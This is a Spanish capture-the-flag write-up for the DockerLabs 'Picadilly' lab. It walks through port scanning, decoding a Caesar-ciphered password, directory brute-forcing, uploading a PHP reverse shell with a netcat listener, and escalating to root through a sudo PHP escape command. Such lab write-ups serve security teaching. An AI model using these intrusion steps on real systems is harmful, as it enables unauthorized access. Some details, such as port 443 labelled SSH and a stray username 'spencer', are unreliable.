---
title: Picadilly - DockerLabs
published: true
categories: DockerLabs
---


| OS     | Dificultad  | Creator           |
| ------ | ----------- | -------------     | 
| Linux  |  Fácil      | kaikoperez        | 


# Reconocimiento

Comenzamos el proceso de reconocimiento identificando los puertos abiertos en el sistema objetivo. 
```shell
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG ports 
```
-  `-p-`: Escanea todos los puertos (1-65535).
- `--open`: Solo muestra los puertos abiertos.
- `-sS`: Realiza un escaneo SYN, que es rápido y discreto.
- `--min-rate=5000`: Envía al menos 5000 paquetes por segundo, acelerando el escaneo.
- `-n`: No realiza resolución DNS.
- `-Pn`: No realiza ping previo para determinar si el host está activo.
- `-vvv`: Muestra resultados detallados y en tiempo real.

![image](https://github.com/user-attachments/assets/857b077a-8e60-4fab-bc4b-2011e3d219dd)

Durante el escaneo, descubrimos que los siguientes puertos están activos:
- `443` (SSH)
- `80` (HTTP)
A continuación, evaluamos si los puertos abiertos presentan alguna vulnerabilidad, además de obtener más información sobre los servicios asociados a esos puertos.

```bash
nmap -p80,443 -sCV 172.17.0.2 -oG targeted
```
![image](https://github.com/user-attachments/assets/454db12c-80e6-4883-b45e-bd5ebedde5cd)

# Exploración Web
Al navegar en el puerto `80`, encontramos un archivo `backup.txt` que contiene la siguiente información encriptada:

![image](https://github.com/user-attachments/assets/c223e6da-3c42-4ce9-8f6c-135dac67d123)

```txt
/// The users mateo password is ////


----------- hdvbfuadcb ------------

"To solve this riddle, think of an ancient Roman emperor and his simple method of shifting letters."

////////////////////////////////////
```

Esto indica que el texto está encriptado mediante el **cifrado César** (un método antiguo donde se desplazan letras en el alfabeto). Aplicando el cifrado César, descubrimos que la palabra encriptada `hdvbfuadcb` se traduce como `easycrazy`.

![image](https://github.com/user-attachments/assets/b267e0da-c76c-4e08-b998-d81d1639215d)

Utilizamos `Gobuster` para realizar un reconocimiento web y explorar los directorios disponibles en el sitio.
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,doc,html,txt,img
```
- `gobuster dir` - Indica que estás utilizando la herramienta Gobuster para realizar un escaneo de directorios.
- `-u http://172.17.0.2/` Especifica la URL objetivo que deseas escanear en busca de directorios.
- `-w` Especifica que diccionario queremos usar
- `-x` Para indicar que tipo de extension queremos que nos encuentre

![image](https://github.com/user-attachments/assets/4124f3fa-0b88-4c21-896b-45ff077a1736)

Observamos que el puerto `443` responde al nombre `picadilly.lab`, así que añadimos este dominio en `/etc/hosts` y accedemos a esta página, donde encontramos una sección de subida de archivos y una ruta `uploads.php` en el código fuente.

![image](https://github.com/user-attachments/assets/fc002df1-e9f5-4c21-be95-0544d4f4068c)

## Intrusión en la Máquina
Aprovechamos la sección de subida de archivos para cargar una reverseshell en PHP. ara esto, generamos una reverseshell desde **Pentest Monkey**, una herramienta popular para crear shells PHP que nos permiten obtener acceso remoto al servidor. La ruta de la reverseshell es la siguiente:

[Reverseshell de Pentest Monkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)

### Pasos para Cargar la Reverseshell

1. **Preparar la Reverseshell**: Configuramos la reverseshell en nuestro sistema..
2. **Subir el Archivo**: Cargamos el archivo en la sección de subida.
3. **Ejecutar la Reverseshell**: Accedemos a la ruta de la reverseshell cargada para activar la conexión.

En paralelo, escuchamos en nuestro sistema usando `netcat`:
```bash 
nc -lvnp 4444
```

Luego, accedemos a la ruta de la página web donde hemos cargado la reverseshell:

![image](https://github.com/user-attachments/assets/4f49a3e9-f08d-4bdb-8af7-ea29c73bed4a)

Obtuvimos acceso inicial al servidor como www-data.

![image](https://github.com/user-attachments/assets/ec688504-bc7e-4c03-8809-5fa9760664b2)

## TTY ReverseShell

### Iniciar una sesión de shell interactiva
En nuestra shell básica, ejecutamos el siguiente comando para forzar la creación de una sesión de bash interactiva:
```bash
script /dev/null -c bash
```
### Suspender la shell
Una vez que el comando anterior está en ejecución, utilizamos
```bash
Control+Z
```
para suspender temporalmente nuestra shell.

### Preparar nuestro terminal local:
Antes de volver a nuestra shell, configuramos nuestro terminal local:
```bash
stty raw -echo; fg
```

### Resetear la configuración del terminal
Ahora que tenemos el control de la shell, la reseteamos para asegurar que se comporta correctamente:
```bash
reset
```

### Configura el tipo de terminal:
```bash
xterm
export TERM=xterm
export SHELL=bash
```

# Istrucion usuario www-data.

Como antes habiamos encontrado una contraeña llamada `easycrazy` vamos a ver si es de algun usuario del sistema. Para ello usaremos `ls -l /home` y vemos que el usuario es `mateo`.

![image](https://github.com/user-attachments/assets/b703bddc-c886-4dbb-9877-84bbd57f3cf0)

Si accedemosa ese usuario vemos que la conexion se ha establecido con esa contraseña.

![image](https://github.com/user-attachments/assets/01465b34-8ce9-469b-8910-b2c940c1ea72)

# Escalada de privilegios

Al ejecutar `sudo -l`, notamos que spencer tiene permisos para ejecutar `php` como `root`.Utilizando [GTFOBins](https://gtfobins.github.io/gtfobins/awk/#shell) sabemos cómo explotar estos binarios.

![image](https://github.com/user-attachments/assets/e3dbe429-7ac7-4042-a694-18af209e67b1)

```bash
sudo /usr/bin/php -r "pcntl_exec('/bin/sh', ['-p']);"
```

Con este comando, obtuvimos acceso root.

![image](https://github.com/user-attachments/assets/f15c6502-638b-45a7-a34e-555f458897ef)
